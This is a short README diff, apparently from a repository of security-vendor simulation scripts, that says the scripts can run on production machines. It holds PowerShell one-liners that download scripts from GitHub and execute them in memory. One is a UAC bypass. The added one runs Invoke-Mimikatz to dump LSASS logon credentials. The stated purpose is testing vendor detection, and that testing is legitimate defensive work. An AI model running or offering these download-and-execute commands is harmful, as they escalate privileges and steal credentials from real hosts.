@@ -28,3 +28,8 @@ The scripts can be executed on production envirenmnet.
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-UAC2.ps1"); Invoke-ComputerDefaults;`
 
 ## Antimalware Scan Interface (AMSI) 
+
+## Credentials Theft
+
+### 1. Lsass logon passwords
+`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -DumpCreds;`
